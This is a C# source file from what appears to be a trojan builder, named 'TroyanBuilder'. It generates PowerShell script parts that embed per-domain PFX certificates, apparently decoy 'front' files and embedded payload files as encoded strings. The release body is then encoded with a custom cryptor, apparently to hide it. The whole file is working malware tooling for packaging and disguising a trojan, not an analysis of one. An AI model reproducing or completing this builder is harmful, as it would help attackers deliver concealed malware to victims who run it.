namespace TroyanBuilder;

public abstract class BodyBuilder: CustomBuilder
{
    protected override string SourceDir => Model.TroyanScriptDir;
    
    protected override string[] PriorityTasks => new [] {"dnsman", "cert" };
    protected override string[] UnpriorityTasks => new [] {"extraupdate" };
    protected override string EntryPoint => "program";

    protected override void InternalBuild(string server)
    {
        MakeCert();
        MakeEmbeddings();
    }
    
    private string MakeCert()
    {
        var template = @"

        $xdata = @{
        _CERT
    }
        
";

        var stringList = new List<string>();

        foreach (var domainIp in Model.DomainIps)
        {
            foreach (var domain in domainIp.Domains)
            {
                var pathPfx = PfxFile(domain);
                if (string.IsNullOrEmpty(pathPfx))
                {
                    throw new Exception($"The certificate is not found for domain: {domain}");
                }

                var binaryData = File.ReadAllBytes(pathPfx);
                var base64 = CustomCryptor.EncodeBytes(binaryData);
                var chunkSize = 200;
                var chunks = new List<string>();

                for (var i = 0; i < base64.Length; i += chunkSize)
                {
                    var chunk = base64.Substring(i, Math.Min(chunkSize, base64.Length - i));
                    chunks.Add(chunk);
                }

                var code = "'" + string.Join("'+" + Environment.NewLine + "'", chunks) + "'";
                stringList.Add($"'{domain}'={code}");
            }
        }

        var listString = string.Join(Environment.NewLine, stringList);
        template = template.Replace("_CERT", listString);

        var outputPath = Path.Combine(Model.TroyanScriptDir, "consts_cert.ps1");
        File.WriteAllText(outputPath, template);

        return template;
    }
    
    private void MakeEmbeddings()
    {
        var template = @"
        $xfront = @(
        _FRONT_X
        )
        $xfront_name = @(
        _FRONT_NAME
        )
        $xembed = @(
        _EMBED_X
        )
        $xembed_name = @(
        _EMBED_NAME
        )
";
        
        var (frontName, frontData) = ReadEmbeddings("front");
        template = template.Replace("_FRONT_X", frontData, StringComparison.InvariantCulture);
        template = template.Replace("_FRONT_NAME", frontName);

        var (embedName, embedData) = ReadEmbeddings("embeddings");
        template = template.Replace("_EMBED_X", embedData, StringComparison.InvariantCulture);
        template = template.Replace("_EMBED_NAME", embedName);

        var outputPath = Path.Combine(Model.TroyanScriptDir, "consts_embeddings.ps1");
        File.WriteAllText(outputPath, template);
    }
    
    private (string fileNames, string encodedData) ReadEmbeddings(string name)
    {
        var srcFolder = Path.Combine(Model.UserDataDir, name);
        
        if (!Directory.Exists(srcFolder))
        {
            return ("", "");
        }
        
        var files = Directory.GetFiles(srcFolder);

        var resultNames = new List<string>();
        var resultData = new List<string>();

        foreach (var file in files)
        {
            try
            {
                var fileName = Path.GetFileName(file);
                
                var fileContent = File.ReadAllBytes(file);
                var encodedContent = CustomCryptor.EncodeBytes(fileContent);

                resultNames.Add(fileName);
                resultData.Add(encodedContent);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error processing file '{file}': {ex.Message}");
            }
        }
        
        if (resultData.Any())
        {
            var names = ConvertArrayToQuotedString(resultNames);
            var data = ConvertArrayToQuotedString(resultData);
            return (names, data);
        }

        return ("", "");
    }
    
    static string ConvertArrayToQuotedString(List<string> array)
    {
        if (array == null || !array.Any())
        {
            throw new ArgumentException("Array cannot be null or empty.", nameof(array));
        }
        
        var quotedString = string.Join(",", array.Select(item => $"\"{item}\""));
        return quotedString;
    }
}

public class BodyBuilderDebug : BodyBuilder
{
    protected override string OutputFile => Model.BodyDebug;
}

public class BodyBuilderRelease : BodyBuilder
{
    protected override string OutputFile => Model.BodyRelease;

    protected override void PostBuild()
    {
        CustomCryptor.Encode(File.ReadAllText(OutputFile), Model.Body);
    }
}